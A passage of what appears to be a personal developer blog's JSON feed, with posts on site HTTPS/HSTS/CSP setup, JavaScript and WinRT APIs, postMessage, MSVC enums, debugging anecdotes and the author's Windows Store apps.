[L,R=301]</code></pre><p>\n    Turning on HSTS is as simple as adding the HSTS HTTP header. However, the description in the above link didn't work because my site's NFSN realm isn't on the latest Apache yet. Instead I added\n    the following to my .htaccess. After I'm comfortable with everything working well for a few days I'll start turning up the max-age to the recommended minimum value of 180 days.\n  </p><pre><code>Header set Strict-Transport-Security \"max-age=3600;\" </code></pre><p>\n    Finally, to turn on CSP I started up Fiddler with my <a href=\"https://github.com/david-risney/CSP-Fiddler-Extension\">CSP Fiddler extension</a>. It allows me to determine the most restrictive CSP\n    rules I could apply and still have all resources on my page load. From there I found and removed inline script and some content loaded via http and otherwise continued tweaking my site and CSP\n    rules.\n  </p><p>\n    After I was done I checked out my site on <a href=\"https://www.ssllabs.com/ssltest/\">SSL Lab's SSL Test</a> to see what I might have done wrong or needed improving. The first time I went through\n    these steps I hadn't included the chain file which the SSL Test told me about. I was able to add that file to the same files I had already previously generated from the Let's Encrypt client and\n    do another NFSN assistance request and 15 minutes later the SSL Test had upgraded me from 'B' to 'A'.\n  </p></div></div>\n",
			"date_published": "2016-02-04T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-01/Unicode+Clock/",
			"url": "https://deletethis.net/dave/2016-01/Unicode+Clock/",
			"title": "Unicode Clock",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've made a <a href=\"http://david-risney.github.io/UnicodeClock/\">Unicode Clock in JavaScript</a>.\n  </p><p>\n    Unicode has code points for all 30 minute increments of clock faces. This is a simple project to display the one closest to the current time written in JavaScript.\n  </p><p>\n    Because the code points are all above 0xFFFF, I make use of some ES6 additions. I use the \\u{XXXXXX} style escape sequence since the old style JavaScript escape sequence \\uXXXX only supports code\n    points up to 0xFFFF. I also use the method String.codePointAt rather than String.charCodeAt because the code points larger than 0xFFFF are represented in JavaScript strings using surrogate pairs\n    and charCodeAt gives the surrogate value rather than codePointAt which gives the code point represented by the pair of surrogates.\n  </p><pre><code>\"🕛\".codePointAt(0)<br>128347<br>\"🕛\".charCodeAt(0)<br>55357<br></code></pre><p>\n    🕐🕑🕒🕓🕔🕕🕖🕗🕘🕙🕚🕛🕜🕝🕞🕟🕠🕡🕢🕣🕤🕥🕦🕧\n  </p><p>\n    The ordering of the code points does not make it simple to do this. I initially guessed the first code point in the range would be 12:00 followed by 12:30, 1:00 and so on. But actually 1:00 is\n    first followed by all the on the hour times then all the half hour times.\n  </p></div></div>\n",
			"date_published": "2016-01-24T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-01/JavaScript+Types+and+WinRT+Types/",
			"url": "https://deletethis.net/dave/2016-01/JavaScript+Types+and+WinRT+Types/",
			"title": "JavaScript Types and WinRT Types",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"></div>\n",
			"date_published": "2016-01-21T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2014-05/Cloud+Share+-+New+App/",
			"url": "https://deletethis.net/dave/2014-05/Cloud+Share+-+New+App/",
			"title": "Cloud Share - New App",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've put a new app on the Windows Store: <a href=\"http://apps.microsoft.com/windows/en-us/app/a2b392c8-a94e-44ab-b52b-dea2c6c93572\">Cloud Share</a>. It connects the web to your Windows 8 share\n    charm.\n  </p><p>\n    I did the <a href=\"https://github.com/david-risney/WebShare\">development on GitHub</a> and quite enjoyed myself. I wasn't sure I liked the game-ification of development in GitHub's dashboard\n    showing you your longest development streak in days. However I realized that it encourages me to do work on my personal project and anything that aids in holding my attention on and helping me\n    finish these projects is a good thing.\n  </p></div></div>\n",
			"date_published": "2014-05-23T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2014-05/location.hash+and+location.search+are+bad+and+they+should+feel+bad/",
			"url": "https://deletethis.net/dave/2014-05/location.hash+and+location.search+are+bad+and+they+should+feel+bad/",
			"title": "location.hash and location.search are bad and they should feel bad",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  The <a href=\"http://www.w3.org/html/wg/drafts/html/master/browsers.html#the-location-interface\">DOM location interface</a> exposes the HTML document's URI parsed into its properties. However, it is\n  ancient and has problems that bug me but otherwise rarely show up in the real world. Complaining about mostly theoretical issues is why blogging exists, so here goes:\n  <ul><li>The location object's search, hash, and protocol properties are all misnomers that lead to confusion about the correct terms:\n      <ul><li>The 'search' property returns the URI's query property. The query property isn't limited to containing search terms.\n        </li><li>The 'hash' property returns the URI's fragment property. This one is just named after its delimiter. It should be called the fragment.\n        </li><li>The 'protocol' property returns the URI's scheme property. A URI's scheme isn't necessarily a protocol. The http URI scheme of course uses the HTTP protocol, but the https URI scheme is\n        the HTTP protocol over SSL/TLS - there is no HTTPS protocol. Similarly for something like mailto - there is no mailto wire protocol.\n        </li></ul></li><li>The 'hash' and 'search' location properties both return null in the case that their corresponding URI <a href=\"http://url.spec.whatwg.org/#dom-url-hash\">property doesn't exist or if its the\n    empty string</a>. A URI with no query property and a URI with an empty string query property that are otherwise the same, are not equal URIs and are allowed by HTTP to return different content.\n    Similarly for the fragment. Unless the specific URI scheme defines otherwise, <a href=\"http://tools.ietf.org/html/rfc3986#section-6.2.3\">an empty query or hash isn't the same as no query or\n    hash</a>.\n    </li></ul>But like complaining about <a href=\"http://en.wikipedia.org/wiki/Metric_time\">the number of minutes in an hour</a> none of this can ever change without huge compat issues on the web.\n  Accordingly I can only give my thanks to Anne van Kesteren and the awesome work on the <a href=\"http://url.spec.whatwg.org/\">URL standard</a> moving towards a more sane (but still working\n  practically within the constraints of compat) location object and URI parsing in the browser.\n</div></div>\n",
			"date_published": "2014-05-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2014-05/Debugging+anecdote+-+the+color+transparent+black+breaks+accessibility+/",
			"url": "https://deletethis.net/dave/2014-05/Debugging+anecdote+-+the+color+transparent+black+breaks+accessibility+/",
			"title": "Debugging anecdote - the color transparent black breaks accessibility ",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Some time back while I was working on getting the <a href=\"http://msdn.microsoft.com/en-us/library/windows/apps/dn631759.aspx\">Javascript Windows Store app platform</a> running on Windows Phone\n    (now available on the last Windows Phone release!) I had an interesting bug that in retrospect is amusing.\n  </p><p>\n    I had just finished a work item to get accessibility working for JS WinPhone apps when I got a new bug: With some set of JS apps, accessibility appeared to be totally broken. At that time in\n    development the only mechanism we had to test accessibility was a test tool that runs on the PC, connects to the phone, and dumps out the accessibility tree of whatever app is running on the\n    phone. In this bug, the tool would spin for a while and then timeout with an error and no accessibility information.\n  </p><p>\n    My first thought was this was an issue in my new accessibility code. However, debugging with breakpoints on my code I could see none of my code was run nor the code that should call it. The code\n    that called that code was a more generic messaging system that hit my breakpoints constantly.\n  </p><p>\n    Rather than trying to work backward from the failure point, I decided to try and narrow down the repro and work forwards from there. One thing all the apps with the bug had in common was their\n    usage of <a href=\"http://try.buildwinjs.com/\">WinJS</a>, but not all WinJS apps demonstrated the issue. Using a binary search approach on one such app I removed unrelated app code until all that\n    was left was the app's usage of the WinJS AppBar and the bug still occurred. I replaced the WinJS AppBar usage with direct usage of the underlying AppBar WinRT APIs and continued.\n  </p><p>\n    Only some calls to the AppBar WinRT object produced the issue:\n  </p><pre><code>        var appBar = Windows.UI.WebUI.Core.WebUICommandBar.getForCurrentView(); <br>        // appBar.opacity = 1;<br>        // appBar.closeDisplayMode = Windows.UI.WebUI.Core.WebUICommandBarClosedDisplayMode.default;<br>        appBar.backgroundColor = Windows.UI.Colors.white; // Bug! </code></pre>Just\n  setting the background color appeared to cause the issue and I didn't even have to display the AppBar. Through additional trial and error I was blown away to discover that some colors I would set\n  caused the issue and other colors did not. Black wouldn't cause the issue but transparent black would. So would aqua but not white.\n  <p>\n    I eventually realized that predefined WinRT color values like Windows.UI.Colors.aqua would cause the issue while JS literal based colors didn't cause the issue (<a href=\"http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.color.aspx\">Windows.UI.Color</a> is a WinRT struct which projects in JS as a JS literal object with the struct members as JS\n    object properties so its easy to write something like <code>{r: 0, g: 0, b: 0, a: 0}</code> to make a color) and I had been mixing both in my tests without realizing there would be a difference.\n    I debugged into the backgroundColor property setter that consumed the WinRT color struct to see what was different between Windows.UI.Colors.black and <code>{a: 1, r: 0, g: 0, b: 0}</code> and\n    found the two structs to be byte wise exactly the same.\n  </p><p>\n    On a hunch I tried my test app with only a reference to the color and otherwise no interaction with the AppBar and not doing anything with the actual reference to the color:\n    <code>Windows.UI.Colors.black;</code>. This too caused the issue. I knew that the implementation for these WinRT const values live in a DLL and guessed that something in the code to create these\n    predefined colors was causing the issue. I debugged in and no luck. Now I also have experienced crusty code that would <a href=\"http://blogs.msdn.com/b/oldnewthing/archive/2004/01/27/63401.aspx\">do exciting things in its DllMain</a>, the function that's called when a DLL is loaded into the process so I tried modifying my\n    C++ code to simply LoadLibrary the DLL containing the WinRT color definition, windows.ui.xaml.dll and found the bug still occurred! A short lived moment of relief as the world seemed to make\n    sense again.\n  </p><p>\n    Debugging into DllMain nothing interesting happened. There were interesting calls in there to be sure, but all of them behind conditions that were false. I was again stumped. On another hunch I\n    tried renaming the DLL and only LoadLibrary'ing it and the bug went away. I took a different DLL renamed it windows.ui.xaml.dll and tried LoadLibrary'ing that and the bug came back. Just the name\n    of the DLL was causing the issue.\n  </p><p>\n    I searched for the DLL name in our source code index and found hits in the accessibility tool. Grinning I opened the source to find that the accessibility tool's phone side service was trying to\n    determine if a process belonged to a XAML app or not because XAML apps had a different accessibility contract. It did this by checking to see if windows.ui.xaml.dll was loaded in the target\n    process.\n  </p><p>\n    At this point I got to fix my main issue and open several new bugs for the variety of problems I had just run into. This is a how to on writing software that is difficult to debug.\n  </p></div></div>\n",
			"date_published": "2014-05-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-08/FitBit+and+WebOC+Application+Compatibility+Errors/",
			"url": "https://deletethis.net/dave/2013-08/FitBit+and+WebOC+Application+Compatibility+Errors/",
			"title": "FitBit and WebOC Application Compatibility Errors",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  I just got a FitBit One from my wife. Unfortunately I had issues running their app on my Windows 8.1 Preview machine. But I recognized the errors as IE compatibility issues, for instance an IE\n  dialog popup from the FitBit app telling me about an error in the app's JavaScript. Given <a href=\"http://deletethis.net/dave/?uri=http%3A%2F%2Fdavescoolblog.blogspot.com%2F2011%2F04%2Fie9-document-mode-in-weboc.html\">my previous post on WebOC versioning</a> you may guess what I tried next. I\n  went into the registry and tried out different browser mode and document mode versions until I got the FitBit software running without error. Ultimately I found the following registry value to work\n  well ('FitBit connect.exe' set to DWORD decimal 8888).\n  <pre><code>Windows Registry Editor Version 5.00<br><br>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION]<br>\"Fitbit Connect.exe\"=dword:000022b8<br><br></code></pre>For\n  those familiar with the Windows registry the above should be enough. For those not familiar, copy and paste the above into notepad, save as a file named \"fitbit.reg\", and then double click the reg\n  file and say 'Yes' to the prompt. Hopefully in the final release of Windows 8.1 this won't be an issue.\n</div></div>\n",
			"date_published": "2013-08-29T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-08/Moving+PowerShell+data+into+Excel/",
			"url": "https://deletethis.net/dave/2013-08/Moving+PowerShell+data+into+Excel/",
			"title": "Moving PowerShell data into Excel",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  PowerShell nicely includes ConvertTo-CSV and ConvertFrom-CSV which allow you to serialize and deserialize your PowerShell objects to and from CSV. Unfortunately the CSV produced by ConvertTo-CSV is\n  not easily opened by Excel which expects by default different sets of delimiters and such. Looking online you'll find folks who recommend using automation via COM to create a new Excel instance and\n  copy over the data in that fashion. This turns out to be very slow and impractical if you have large sets of data. However you can use automation to open CSV files with not the default set of\n  delimiters. So the following isn't the best but it gets Excel to open a CSV file produced via ConvertTo-CSV and is faster than the other options:\n  <pre><code>Param([Parameter(Mandatory=$true)][string]$Path);<br><br>$excel = New-Object -ComObject Excel.Application<br><br>$xlWindows=2<br>$xlDelimited=1 # 1 = delimited, 2 = fixed width<br>$xlTextQualifierDoubleQuote=1 # 1= doublt quote, -4142 = no delim, 2 = single quote<br>$consequitiveDelim = $False;<br>$tabDelim = $False;<br>$semicolonDelim = $False;<br>$commaDelim = $True;<br>$StartRow=1<br>$Semicolon=$True<br><br>$excel.visible=$true<br>$excel.workbooks.OpenText($Path,$xlWindows,$StartRow,$xlDelimited,$xlTextQualifierDoubleQuote,$consequitiveDelim,$tabDelim,$semicolonDelim, $commaDelim);</code></pre>See\n  <a href=\"http://msdn.microsoft.com/en-us/library/ff837097.aspx\">Workbooks.OpenText documentation</a> for more information.\n</div></div>\n",
			"date_published": "2013-08-15T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-08/Serializing+JavaScript+Promise+Execution/",
			"url": "https://deletethis.net/dave/2013-08/Serializing+JavaScript+Promise+Execution/",
			"title": "Serializing JavaScript Promise Execution",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  Occasionally I have need to run a set of unrelated promises in series, for instance an object dealing with a WinRT camera API that can only execute one async operation at a time, or an object\n  handling postMessage message events and must resolve associated async operations in the same order it received the requests. The solution is very simply to keep track of the last promise and when\n  adding a new promise in serial add a continuation of the last promise to execute the new promise and point the last promise at the result. I encapsulate the simple solution in a simple\n  constructor:<br><br><pre><code>    function PromiseExecutionSerializer() {<br>        var lastPromise = WinJS.Promise.wrap(); // Start with an empty fulfilled promise.<br><br>        this.addPromiseForSerializedExecution = function(promiseFunction) {<br>            lastPromise = lastPromise.then(function () {<br>                // Don't call directly so next promise doesn't get previous result parameter.<br>                return promiseFunction();<br>            });<br>        }<br>    }</code></pre><br>\n<p>The only thing to watch out for is to ensure you don't pass the result of a previous promise onto a subsequent promise that is unrelated.</p>\n</div></div>\n",
			"date_published": "2013-08-10T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-08/Considerate+MessagePort+Usage/",
			"url": "https://deletethis.net/dave/2013-08/Considerate+MessagePort+Usage/",
			"title": "Considerate MessagePort Usage",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><img align=\"right\" alt=\"Sharing by leezie5. Two squirrels sharing food hanging from a bird feeder. Used under Creative Commons license Attribution-NonCommercial-NoDerivs 2.0 Generic.\" src=\"http://farm7.staticflickr.com/6013/5912219625_ece631b7e6_m.jpg\">When writing a JavaScript library that uses postMessage and the message event, I must be considerate of other JS code that will be\n  running along side my library. I shouldn't assume I'm the only sender and receiver on a caller provided MessagePort object. This means obviously I should use addEventListener(\"message\" rather than\n  the onmessage property (see related <a href=\"http://blogs.msdn.com/b/oldnewthing/archive/2005/06/07/426294.aspx\">What if two programs did this?</a>). But considering the actual messages traveling\n  over the message channel I have the issue of accidentally processing another libraries messages and having another library accidentally process my own message. I have a few options for playing nice\n  in this regard:<br><dl><dt>\n      Require a caller provided unique MessagePort\n    </dt><dd>\n      This solves the problem but puts a lot of work on the caller who may not notice nor follow this requirement.\n    </dd><dt>\n      Uniquely mark my messages\n    </dt><dd>\n      To ensure I'm acting upon my own messages and not messages that happen to have similar properties as my own, I place a 'type' property on my postMessage data with a value of a URN unique to me\n      and my JS library. Usually because its easy I use a <a href=\"http://tools.ietf.org/html/rfc4122\">UUID URN</a>. There's no way someone will coincidentally produce this same URN. With this I can\n      be sure I'm not processing someone else's messages. Of course there's no way to modify my postMessage data to prevent another library from accidentally processing my messages as their own. I\n      can only hope they take similar steps as this and see that my messages are not their own.\n    </dd><dt>\n      Use caller provided MessagePort only to upgrade to new unique MessagePort\n    </dt><dd>\n      I can also make my own unique MessagePort for which only my library will have the end points. This does still require the caller to provide an initial message channel over which I can\n      communicate my new unique MessagePort which means I still have the problems above. However it clearly reduces the surface area of the problem since I only need once message to communicate the\n      new MessagePort.\n    </dd></dl>The best solution is likely all of the above.<br>\n  Photo is <a href=\"http://www.flickr.com/photos/leeziet/5912219625/\">Sharing</a> by <a href=\"http://www.flickr.com/photos/leeziet/\">leezie5</a>. Two squirrels sharing food hanging from a bird\n  feeder. Used under Creative Commons license Attribution-NonCommercial-NoDerivs 2.0 Generic.\n</div></div>\n",
			"date_published": "2013-08-07T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/URI+functions+in+Windows+Store+Applications/",
			"url": "https://deletethis.net/dave/2013-07/URI+functions+in+Windows+Store+Applications/",
			"title": "URI functions in Windows Store Applications",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"></div>\n",
			"date_published": "2013-07-25T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/C--+constructor+member+initializers+run+in+member+declaration+order/",
			"url": "https://deletethis.net/dave/2013-07/C--+constructor+member+initializers+run+in+member+declaration+order/",
			"title": "C++ constructor member initializers run in member declaration order",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"></div>\n",
			"date_published": "2013-07-18T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/Subtleties+of+postMessage/",
			"url": "https://deletethis.net/dave/2013-07/Subtleties+of+postMessage/",
			"title": "Subtleties of postMessage",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><div><p>\n      In IE10 and other new browsers one may create MessageChannel objects that have two MessagePorts each connected (w3c spec calls it entangled) to one another such that postMessage on one port\n      results in the message event firing on the other. You can pass an array of ports as the last parameter to postMessage and they show up in the ports property of the message event arg.\n    </p><h2>\n      Origin\n    </h2><p>\n      The postMessage here is like the worker postMessage and unlike the window and iframe postMessage in that it applies no origin checking:\n    </p><ol><li>No origin postMessage in workers and MessagePorts: <strong>postMessage(messageData, ports)</strong></li><li>Origin postMessage in windows and iframes: <strong>postMessage(messageData, targetOrigin, ports)</strong></li></ol><p>\n      Unfortunately the origin isn't an optional parameter at the end to make the two postMessages have the same signature.\n    </p><p>\n      On the event handler side, the event arg always has an origin property. But in the no origin case it is always the empty string.\n    </p><h2>\n      Source\n    </h2><p>\n      There is also a source property on the message event arg which if set is an object that has a postMessage property allowing you to post back to your caller. It is set for the origin case,\n      however, in the no origin case this property is null. This is somewhat reasonable because in the case of MessagePort and Workers there are only two endpoints so you always know the source of a\n      message implicitly. Unlike the origin case in which any iframe or window can be calling postMessage on any other iframe or window and the caller is unknown. So not unreasonable but it would be\n      nice if the source property was always set for consistency.\n    </p><h2>\n      MessageChannel start\n    </h2><p>\n      When a MessageChannel is created it has two MessagePorts, but until those ports are started they will queue up any messages they receive. Once started they will dispatch all queued messages.\n      Ports don't have to be started to send messages.\n    </p><p>\n      A port may be started in two ways, either by explicitly calling the start method on the port, or by setting the onmessage callback property on the port. However, adding an event listener via\n      addEventListener(\"message\", does not start the port. It works this way in IE and Chrome and the spec states this as well.\n    </p><p>\n      The justification is that since you can have only one callback via onmessage that once set you must implicitly be ready to receive messages and its fine to start the port. As opposed to the\n      addEventListener in which case the user agent cannot start implicitly because it doesn't know how many event listeners will be added.  I found <a href=\"http://www.w3.org/2011/11/01-geolocation-minutes.html\">Hixie stating this justification</a> in geoloc meeting notes.\n    </p><h2>\n      Links\n    </h2><p><a href=\"http://dev.w3.org/html5/postmsg/\">W3C Spec</a></p><p><a href=\"http://dev.opera.com/articles/view/window-postmessage-messagechannel/\">Opera introduction</a></p></div></div></div>\n",
			"date_published": "2013-07-15T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/Percent+Clcok+Windows+Store+App+Development+Notes/",
			"url": "https://deletethis.net/dave/2013-07/Percent+Clcok+Windows+Store+App+Development+Notes/",
			"title": "Percent Clcok Windows Store App Development Notes",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><div><p>\n      My third completed Windows Store app is <a href=\"http://apps.microsoft.com/windows/en-us/app/percent-clock/e1560938-5720-4b5f-a19e-707f1b68e09f/\">Percent Clock</a> which displays portions of a\n      time span like the time of the day or time until your next birthday, as a percentage. This was a small project I had previously started as a webpage and converted and finished as an HTML\n      JavaScript Windows Store app.\n    </p><p>\n      The only somewhat interesting aspect of this app is that its the first app for which I tried charging. I picked the minimum amount for price 1.49 USD as it is a simple app and unsurprisingly it\n      has sold very poorly. I'm considering releasing new instances of the app for specific scenarios:\n    </p><ul><li>Death Clock: viewing your current age with respect to your life expectancy as a percentage.\n      </li><li>New Year Countdown: percentage of the year until New Years.\n      </li></ul></div></div></div>\n",
			"date_published": "2013-07-11T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/WinRT+PropertySet+Changed+Event+Danger/",
			"url": "https://deletethis.net/dave/2013-07/WinRT+PropertySet+Changed+Event+Danger/",
			"title": "WinRT PropertySet Changed Event Danger",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><div><p>\n      The Windows Runtime API <a href=\"http://msdn.microsoft.com/en-us/library/windows/apps/windows.foundation.collections.propertyset.aspx\">Windows.Foundation.Collections.PropertySet</a> class​ is a\n      nice string name to object value map that has a changed event that fires when the contents of the map is modified. Be careful with this event because it fires synchronously from the thread on\n      which the PropertySet was modified. If modified from the UI thread, the UI thread will then wait as it synchronously dispatches the changed event to all listeners which could lead to\n      performance issues or especially from the UI thread deadlock. For instance, deadlock if you have two threads both trying to tell each other about changed events for different PropertySets.\n    </p></div></div></div>\n",
			"date_published": "2013-07-08T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/Words+with+Hints+Windows+8+App+Development+Notes/",
			"url": "https://deletethis.net/dave/2013-07/Words+with+Hints+Windows+8+App+Development+Notes/",
			"title": "Words with Hints Windows 8 App Development Notes",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><div><p>\n      My second completed app for the Windows Store was <a href=\"http://apps.microsoft.com/windows/en-us/app/words-with-hints/e302a949-452d-4086-8261-4d93d2f4f53a/\">Words with Hints</a> a companion\n      to Words with Friends or other Scrabble like games that gives you *ahem* hints. You provide your tiles and optionally letters placed in a line on the board and Words with Hints gives you word\n      options.\n    </p><p>\n      I wrote this the first time by building a regular expression to check against my dictionary of words which made for a slow app on the Surface. In subsequent release of the app I now spawn four\n      web workers (one for each of the Surface's cores) each with its own fourth of my dictionary. Each fourth of the dictionary is a <a href=\"http://en.wikipedia.org/wiki/Trie\">trie</a> which makes\n      it easy for me to discard whole chunks of possible combinations of Scrabble letters as I walk the tree of possibilities.\n    </p><p>\n      The dictionaries are large and takes a noticeable amount of time to load on the Surface. The best performing mechanism I found to load them is as JavaScript source files that simply define\n      their portion of the dictionary on the global object and synchronously (only on the worker so not blocking the UI thread). Putting them into .js files means they take advantage of <a href=\"http://msdn.microsoft.com/en-us/library/windows/apps/hh849088.aspx#take_advantage_of_bytecode_caching\">bytecode caching</a> making them load faster. However because the data is mostly strings\n      and not code there is a dramatic size increase when the app is installed. The total size of the four dictionary .js files is about 44Mb. The bytecode cache for the dictionary files is about\n      double that 88Mb meaning the dictionary plus the bytecode cache is 132Mb.\n    </p><p>\n      To handle the bother of postMessage communication and web workers this was the first app in which I used my promise MessagePort project which I'll discuss more in the future.\n    </p><p>\n      This is the first app in which I used the <a href=\"http://msdn.microsoft.com/en-US/library/hh506371(v=msads.10).aspx\">Microsoft Ad SDK</a>. It was difficult to find the install for the SDK and\n      difficult to use their website, but once setup, the Ad SDK was easy to import into VS and easy to use in my app.\n    </p></div></div></div>\n",
			"date_published": "2013-07-04T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-07/MSVC--+64bit+Enums/",
			"url": "https://deletethis.net/dave/2013-07/MSVC--+64bit+Enums/",
			"title": "MSVC++ 64bit Enums",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><div><p>\n      If you want to represent a value larger than 32bits in an enum in MSVC++ you can use C++0x style syntax to tell the compiler exactly what kind of integral type to store the enum values.\n      Unfortunately by default an enum is always 32bits, and additionally while you can specify constants larger than 32bits for the enum values, they are silently truncated to 32bits.\n    </p><p>\n      For instance the following doesn't compile because Lorem::a and Lorem::b have the same value of '1':\n    </p><pre><br><code>enum Lorem {<br>    a = 0x1,<br>    b = 0x100000001<br>} val;<br><br>switch (val) {<br>    case Lorem::a:<br>        break;<br>    case Lorem::b:<br>        break;<br>}<br></code></pre><p>\n      Unfortunately it is not an error to have b's constant truncated, and the previous without the switch statement does compile just fine:\n    </p><pre><br><code>enum Lorem {<br>    a = 0x1,<br>    b = 0x100000001<br>} val;<br></code></pre><p>\n      But you can explicitly specify that the enum should be represented by a 64bit value and get expected compiling behavior with the following:\n    </p><pre><br><code>enum Lorem : UINT64 {<br>    a = 0x1,<br>    b = 0x100000001<br>} val;<br><br>switch (val) {<br>    case Lorem::a:<br>        break;<br>    case Lorem::b:<br>        break;<br>}<br></code></pre></div></div></div>\n",
			"date_published": "2013-07-01T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-06/Shout+Text+Windows+8+App+Development+Notes/",
			"url": "https://deletethis.net/dave/2013-06/Shout+Text+Windows+8+App+Development+Notes/",
			"title": "Shout Text Windows 8 App Development Notes",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    My first app for Windows 8 was <a href=\"http://apps.microsoft.com/windows/en-us/app/shout-text/d3c22289-d1f6-4ead-a9ef-17abd0e6345a\">Shout Text</a>. You type into Shout Text, and your text is\n    scaled up as large as possible while still fitting on the screen, as you type. It is the closest thing to a Hello World app as you'll find on the Windows Store that doesn't contain that phrase\n    (by default) and I approached it as the simplest app I could make to learn about Windows modern app development and Windows Store app submission.\n  </p><p>\n    I rely on WinJS's default layout to use CSS transforms to scale up the user's text as they type. And they are typing into a simple content editable div.\n  </p><p>\n    The app was too simple for me to even consider using ads or charging for it which I learned more about in future apps.\n  </p><p>\n    The first interesting issue I ran into was that copying from and then pasting into the content editable div resulted in duplicates of the containing div with copied CSS appearing recursively\n    inside of the content editable div. To fix this I had to catch the paste operation and remove the HTML data from the clipboard to ensure only the plain text data is pasted:\n  </p><pre><code>        function onPaste() {<br>            var text;<br><br>            if (window.clipboardData) {<br>                text = window.clipboardData.getData(\"Text\").toString();<br>                window.clipboardData.clearData(\"Html\");<br>                window.clipboardData.setData(\"Text\", util.normalizeContentEditableText(text));<br>            }<br>        }<br>        shoutText.addEventListener(\"beforepaste\", function () { return false; }, false);<br>        shoutText.addEventListener(\"paste\", onPaste, false);</code></pre><p>\n    I additionally found an issue in IE in which applying a CSS transform to a content editable div that has focus doesn't move the screen position of the user input caret - the text is scaled up or\n    down but the caret remains the same size and in the same place on the screen. To fix this I made the following hack to reapply the current cursor position and text selection which resets the\n    screen position of the user input caret.\n  </p><pre><code>        function resetCaret() {<br>            setTimeout(function () {<br>                var cursorPos = document.selection.createRange().duplicate();<br>                cursorPos.select();<br>            }, 200);<br>        }<br><br>        shoutText.attachEvent(\"onresize\", function () { resetCaret(); }, true);</code></pre></div></div>\n",
			"date_published": "2013-06-27T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-06/Windows+Store+on+Windows+8+Fun+For+Independent+Developers/",
			"url": "https://deletethis.net/dave/2013-06/Windows+Store+on+Windows+8+Fun+For+Independent+Developers/",
			"title": "Windows Store on Windows 8 Fun For Independent Developers",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  Having worked on Windows 8 I'm not in a neutral position to review aspects of it, however I'll say from a high level I love taking the following various positives from smart phone apps and app\n  stores and applying it to the desktop:\n  <ul><li>Independent developers can easily publish apps.\n    </li><li>One trusted place for a user to find apps.\n    </li><li>User can trust apps are limited to a declared set of capabilities.\n    </li><li>One common and easy way for users to buy and try apps.\n    </li><li>Easy mechanism for independent developers to collect revenue.\n    </li></ul>Relieving the independent developer of software development overhead, in this case Windows taking care of distribution and sales infrastructure is wonderful for me with my third party\n  developer hat on. This combined with my new found fun of developing in JavaScript and the new Windows Runtime APIs means I've been implementing and finishing various ideas I've had - some for fun\n  and some for productivity on my Surface. Development notes to follow.\n</div></div>\n",
			"date_published": "2013-06-24T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2013-05/Sci-fi+short+stories+disguised+as+Internet+docs/",
			"url": "https://deletethis.net/dave/2013-05/Sci-fi+short+stories+disguised+as+Internet+docs/",
			"title": "Sci-fi short stories disguised as Internet docs",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  The recent short story <a href=\"http://twitter.bug.quietbabylon.com/\">Twitter API returning results that do not respect arrow of time</a> by Tim May written as a Twitter bug report reminded me of a\n  few other short sci-fi stories written in the style of some sort of Internet document:<br><ul><li><a href=\"http://www.ansible.co.uk/writing/c-b-faq.html\">comp.basalisk FAQ</a> by David Langford written as a FAQ.\n    </li><li><a href=\"http://www.abyssapexzine.com/wikihistory/\">Wikihistory</a> by Desmond Warzel presented as a forum thread.\n    </li><li><a href=\"http://www.math.yorku.ca/Who/Faculty/Steprans/Courses/3500/Consciousness/mi269-276.txt\">The Riddle of the Universe and Its Solution</a> by Christopher Cherian written as a scientific\n      report.\n    </li></ul></div></div>\n",
			"date_published": "2013-05-29T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-12/Windows+Remote+Desktop+via+Internet/",
			"url": "https://deletethis.net/dave/2012-12/Windows+Remote+Desktop+via+Internet/",
			"title": "Windows Remote Desktop via Internet",
